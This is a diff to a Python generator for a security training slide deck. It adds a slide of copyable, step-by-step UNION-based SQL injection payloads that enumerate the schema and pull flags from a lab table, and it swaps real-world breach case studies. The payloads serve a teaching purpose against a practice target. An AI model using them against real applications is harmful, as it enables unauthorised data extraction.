@@ -495,7 +495,7 @@ L25_FIX = '''<section class="slide"><div class="slide-inner">
 # ======================= L12 — JWT alg:none ==================================
 L12_TITLE = '''<section class="slide"><div class="slide-inner">
 <div class="flex-row mb2"><span class="badge badge-red">&#128308; Demo 4</span><span style="color:var(--t3);font-size:.8rem">L12 &bull; CWE-347 &bull; OWASP A02:2021</span></div>
-<h1>JWT alg:none &mdash; Forge Your Own Identity Card</h1>
+<h1>JWT Flaw &mdash; Forge Your Own Identity Card</h1>
 <p class="big mt2">&ldquo;We&rsquo;re going to promote ourselves to administrator by editing a cookie.&rdquo;</p>
 </div></section>'''
 
@@ -896,12 +896,12 @@ S_QUESTIONS = '''<section class="slide"><div class="slide-inner">
 
 # ================= v2: RECENT + INDIA-WEIGHTED REAL-WORLD CASES ==============
 RW_G1 = realworld(
- 'Fortinet, 2024 &mdash; SQL injection inside a security product',
- 'A SQL injection flaw in FortiClient EMS &mdash; software enterprises buy <em>to manage endpoint security</em> &mdash; let an unauthenticated attacker run commands on the server. A patch existed. Exploitation in the wild began within days of public disclosure, and the flaw went onto the US authorities&rsquo; &ldquo;known exploited&rdquo; list. The same 25-year-old bug class you just used, shipping in 2024.',
- [('CVE-2023-48788','the identifier'),('9.8 / 10','severity score'),('Days','from disclosure to mass exploitation'),('BFSI','heavily represented among users')],
- 'our scanners check the code we write &mdash; who checks the security products we buy, and how fast can we patch an internet-facing appliance?',
- ('And when it reaches customers &mdash; TalkTalk, UK',
-  'An inherited legacy page with the identical flaw cost TalkTalk <strong>157,000 customers&rsquo; data</strong>, a then-record <strong>&pound;400,000</strong> regulatory fine, around <strong>&pound;77 million</strong> in total costs and <strong>101,000 lost customers</strong>. The chief executive explained it on national television.',
+ 'MOVEit, 2023 &mdash; one SQL injection, thousands of victims',
+ 'MOVEit Transfer is a trusted file-transfer product used by banks, governments, airlines and health systems. A single SQL injection flaw in it was exploited at scale by an extortion group. The organisations breached had done nothing wrong in their own code &mdash; they had simply bought and trusted the same product.',
+ [('2,770+','organisations breached'),('95M+','individuals affected'),('1','flaw, in 1 product'),('&gt;$12B','estimated cumulative cost')],
+ 'which externally exposed third-party products hold our sensitive data &mdash; and how fast could we answer that question when tomorrow&rsquo;s advisory lands?',
+ ('Closer to home &mdash; India, October 2023',
+  'A listing appeared offering the personal data of roughly <strong>815 million Indians</strong> &mdash; including identity and passport details &mdash; reportedly drawn from a national health research database. Investigated by CERT-In, it is among the largest exposures of personal data ever reported anywhere.',
   'red-left'))
 
 RW_L11 = realworld(
@@ -941,12 +941,12 @@ RW_L1 = realworld(
   'red-left'))
 
 RW_G2 = realworld(
- 'MOVEit, 2023 &mdash; one SQL injection, thousands of victims',
- 'MOVEit Transfer is a trusted file-transfer product used by banks, governments, airlines and health systems. A single SQL injection flaw in it was exploited at scale by an extortion group. The organisations breached had done nothing wrong in their own code &mdash; they had simply bought and trusted the same product.',
- [('2,770+','organisations breached'),('95M+','individuals affected'),('1','flaw, in 1 product'),('&gt;$12B','estimated cumulative cost')],
- 'which externally exposed third-party products hold our sensitive data &mdash; and how fast could we answer that question when tomorrow&rsquo;s advisory lands?',
- ('Closer to home &mdash; India, October 2023',
-  'A listing appeared offering the personal data of roughly <strong>815 million Indians</strong> &mdash; including identity and passport details &mdash; reportedly drawn from a national health research database. Investigated by CERT-In, it is among the largest exposures of personal data ever reported anywhere.',
+ 'Fortinet, 2024 &mdash; SQL injection inside a security product',
+ 'A SQL injection flaw in FortiClient EMS &mdash; software enterprises buy <em>to manage endpoint security</em> &mdash; let an unauthenticated attacker run commands on the server. A patch existed. Exploitation in the wild began within days of public disclosure, and the flaw went onto the US authorities&rsquo; &ldquo;known exploited&rdquo; list. The same 25-year-old bug class you just used, shipping in 2024.',
+ [('CVE-2023-48788','the identifier'),('9.8 / 10','severity score'),('Days','from disclosure to mass exploitation'),('BFSI','heavily represented among users')],
+ 'our scanners check the code we write &mdash; who checks the security products we buy, and how fast can we patch an internet-facing appliance?',
+ ('And when it reaches customers &mdash; TalkTalk, UK',
+  'An inherited legacy page with the identical flaw cost TalkTalk <strong>157,000 customers&rsquo; data</strong>, a then-record <strong>&pound;400,000</strong> regulatory fine, around <strong>&pound;77 million</strong> in total costs and <strong>101,000 lost customers</strong>. The chief executive explained it on national television.',
   'red-left'))
 
 RW_G4 = realworld(
@@ -1554,6 +1554,22 @@ G2_DEMO_L0 = '''<section class="slide"><div class="slide-inner">
 </div>
 </div></section>'''
 
+# Copiable, sequential query reference for the G2 L0 walkthrough (sits right
+# after G2_DEMO_L0). Each .sol-pay is user-select:all, so one click copies it.
+G2_QUERIES = '''<section class="slide"><div class="slide-inner">
+<div class="sol-head"><span class="sol-tag">G2</span><div><div class="sol-cwe">CWE-89 &middot; Level 0 &mdash; the full query sequence</div><h2 style="margin:.04em 0">From Search Box to Flag &mdash; Copy Each Step</h2><div class="sol-where">&#128205; Statements &rarr; Search (remarks) box</div></div></div>
+<p class="desc" style="font-size:.8rem;margin:.45rem 0 .35rem">Paste each line into the search box in order (click a box to select it). 7-column query &mdash; your result lands in the <strong>Remarks</strong> cell; <code>#</code> comments out the rest.</p>
+<div style="display:flex;flex-direction:column;gap:.28rem">
+<div><div class="sub" style="color:var(--t2);font-size:.66rem;margin-bottom:.08rem">1 &middot; Confirm the injection &mdash; a lone quote breaks the query (raw error)</div><div class="sol-pay" style="font-size:.78rem;padding:.3rem .6rem;font-weight:600">'</div></div>
+<div><div class="sub" style="color:var(--t2);font-size:.66rem;margin-bottom:.08rem">2 &middot; Count the columns &mdash; 7 works, 8 errors</div><div class="sol-pay" style="font-size:.78rem;padding:.3rem .6rem;font-weight:600">%' ORDER BY 7#</div></div>
+<div><div class="sub" style="color:var(--t2);font-size:.66rem;margin-bottom:.08rem">3 &middot; Find the readable column &mdash; the grid prints 2 in Remarks</div><div class="sol-pay" style="font-size:.78rem;padding:.3rem .6rem;font-weight:600">zzz' UNION SELECT 1,2,3,4,5,6,7#</div></div>
+<div><div class="sub" style="color:var(--t2);font-size:.66rem;margin-bottom:.08rem">4 &middot; Name the database</div><div class="sol-pay" style="font-size:.78rem;padding:.3rem .6rem;font-weight:600">zzz' UNION SELECT 1,database(),3,4,5,6,7#</div></div>
+<div><div class="sub" style="color:var(--t2);font-size:.66rem;margin-bottom:.08rem">5 &middot; List the tables &mdash; find ctf_flags</div><div class="sol-pay" style="font-size:.78rem;padding:.3rem .6rem;font-weight:600">zzz' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()#</div></div>
+<div><div class="sub" style="color:var(--t2);font-size:.66rem;margin-bottom:.08rem">6 &middot; List its columns &mdash; find username, flag</div><div class="sol-pay" style="font-size:.78rem;padding:.3rem .6rem;font-weight:600">zzz' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='ctf_flags'#</div></div>
+<div><div class="sub" style="color:var(--t2);font-size:.66rem;margin-bottom:.08rem">7 &middot; Extract the flag &mdash; read your own row</div><div class="sol-pay" style="font-size:.78rem;padding:.3rem .6rem;font-weight:600">zzz' UNION SELECT username,flag,3,4,5,6,7 FROM ctf_flags#</div></div>
+</div>
+</div></section>'''
+
 G2_MINDSET = '''<section class="slide"><div class="slide-inner">
 <div class="flex-row mb2"><span class="badge badge-yellow">&#128161; Security Mindset</span><span style="color:var(--t3);font-size:.8rem">G2 &bull; SQL injection &mdash; data extraction</span></div>
 <h2 class="mb2">A filtered query is still a built query.</h2>
@@ -1697,16 +1713,16 @@ order = [
  ('new',L12_MINDSET,L,None),
  ('new',yourturn('L12','Promote Yourself to Administrator',
    'You turned your ordinary customer session into an administrator&rsquo;s.',
-   retest='<strong style="color:var(--t1)">The developers heard &ldquo;reject none&rdquo;.</strong> A token whose algorithm says <code>none</code> is now refused &mdash; the unsigned forgery is closed. But they matched the <em>word</em>, not the intent: the check looks for one exact spelling, and a token carries whatever algorithm string you write. <strong>If <code>none</code> is blocked, what isn&rsquo;t?</strong> You have about <strong>5 minutes</strong>.'),L,'handson'),
+   retest='<strong style="color:var(--t1)">The developers now verify the signature.</strong> Earlier the signature segment was never really checked; the server now validates it before trusting the token, and they&rsquo;re confident the forgery is closed. But the fix still has a gap. <strong>What did they miss?</strong> You have about <strong>5 minutes</strong>.'),L,'handson'),
  ('new',L12_FIX,L,None),('new',WHO_L12,L,None),
  ('new',RW_L12,L,'real'),
  # --- G2 (SQLi data extraction) --- ALIGNED: head + sol-style demo + moment + 01/02/03 mindset
- ('new',G2_TITLE,L,None),('new',G2_DEMO_L0,L,None),
+ ('new',G2_TITLE,L,None),('new',G2_DEMO_L0,L,None),('new',G2_QUERIES,L,None),
  ('new',G2_MOMENT,L,None),
  ('new',G2_MINDSET,L,None),
  ('new',yourturn('G2','Read a Table You Were Never Shown',
    'You read data out of a table the application never meant to show you.',
-   retest='<strong style="color:var(--t1)">The developers added a filter</strong> that strips the dangerous SQL keywords out of your search. Run it once and the query looks clean. But it passes over your text a <strong>single time</strong> &mdash; and a keyword can be hidden <em>inside</em> another keyword, so removing it once can leave a valid one behind. <strong>Can you still reach the hidden table?</strong> You have about <strong>5 minutes</strong>.'),L,'handson'),
+   retest='<strong style="color:var(--t1)">The developers added a filter</strong> that strips the dangerous SQL keywords out of your search before it runs, and they&rsquo;re confident the query is now safe. But does removing the keywords actually close it? Work out how the filter behaves, and whether you can still reach the hidden table. You have about <strong>5 minutes</strong>.'),L,'handson'),
  ('new',G2_FIX,L,None),('new',WHO_G2,L,None),
  ('new',RW_G2,L,'real'),
  # --- G4 (reflected XSS, demo only) --- ALIGNED: head + sol-style demo + moment + 01/02/03 mindset
@@ -1760,6 +1776,14 @@ L25_HEAD_INSERT_AT = next(
     if typ == 'new' and ref is L25_TITLE
 )
 
+# 1-based slide index of the G2 copiable-queries slide (inserted right after the
+# G2 L0 demo). A second one-shot migration shifts a saved arrangement past it and
+# slots it in just after the demo, so the insertion keeps a custom order intact.
+G2_QUERIES_INSERT_AT = next(
+    i for i, (typ, ref, ph, kind) in enumerate(order, start=1)
+    if typ == 'new' and ref is G2_QUERIES
+)
+
 def prep2(html, num, phase, kind):
     html = re.sub(r'\s+id="s\d+"', '', html, count=1)
     attrs = ' id="s%d" data-phase="%s"' % (num, phase)
@@ -1802,6 +1826,31 @@ JS_BLOCK = r'''
           var no = o.map(shift);
           var di = no.indexOf('s'+(P+1));             /* the demo's new id */
           no.splice(di<0 ? no.length : di, 0, 's'+P); /* head goes just before it */
+          localStorage.setItem(ORDER_KEY, JSON.stringify(no));
+          var rawH = localStorage.getItem(HIDE_KEY);
+          if(rawH){ localStorage.setItem(HIDE_KEY, JSON.stringify(JSON.parse(rawH).map(shift))); }
+        }
+      }
+      localStorage.setItem(MIG_KEY, '1');
+    }catch(e){}
+  })();
+
+  /* One-shot migration: the G2 copiable-queries slide was inserted at position P,
+     right after the G2 L0 demo (now at s(P-1)). A saved arrangement from just
+     before (one slide shorter) is shifted so every id >= P moves up by one, and
+     the new id (sP) is slotted in immediately AFTER the demo. Runs once. */
+  (function migrateInsertedSlideG2(){
+    var MIG_KEY = 'bs_ws_mig_g2queries_v1', P = __G2_QUERIES_INSERT_AT__;
+    try{
+      if(localStorage.getItem(MIG_KEY)) return;
+      var shift = function(id){ var k = parseInt(id.slice(1),10); return (k>=P) ? ('s'+(k+1)) : id; };
+      var rawO = localStorage.getItem(ORDER_KEY);
+      if(rawO){
+        var o = JSON.parse(rawO);
+        if(o.length === defaultOrder.length - 1){     /* the pre-insert arrangement */
+          var no = o.map(shift);
+          var ai = no.indexOf('s'+(P-1));             /* the G2 demo (unshifted) */
+          no.splice(ai<0 ? no.length : ai+1, 0, 's'+P); /* queries slide goes just after it */
           localStorage.setItem(ORDER_KEY, JSON.stringify(no));
           var rawH = localStorage.getItem(HIDE_KEY);
           if(rawH){ localStorage.setItem(HIDE_KEY, JSON.stringify(JSON.parse(rawH).map(shift))); }
@@ -1953,7 +2002,7 @@ JS_BLOCK = r'''
     }
   });
   document.addEventListener('click',function(e){
-    if(e.target.closest('#slide-mgr,#mgr-btn,#timer-widget,a,button,pre,code,input,select')) return;
+    if(e.target.closest('#slide-mgr,#mgr-btn,#timer-widget,a,button,pre,code,input,select,.sol-pay')) return;
     if(mgr.classList.contains('open')) return;
     if(e.clientX < window.innerWidth*0.3){ prev(); } else { next(); }
   });
@@ -2121,6 +2170,8 @@ head = head.replace('</style>', '.slide.slide-hidden{display:none!important}\n</
 
 JS_BLOCK = JS_BLOCK.replace('__L25_HEAD_INSERT_AT__', str(L25_HEAD_INSERT_AT))
 assert '__L25_HEAD_INSERT_AT__' not in JS_BLOCK, 'migration placeholder not substituted'
+JS_BLOCK = JS_BLOCK.replace('__G2_QUERIES_INSERT_AT__', str(G2_QUERIES_INSERT_AT))
+assert '__G2_QUERIES_INSERT_AT__' not in JS_BLOCK, 'G2 queries migration placeholder not substituted'
 
 final = head + '\n<div id="deck">\n' + '\n'.join(slides_html) + '\n</div>\n' + JS_BLOCK + '\n</body>\n</html>\n'
 open(OUT,'w',encoding='utf-8').write(final)
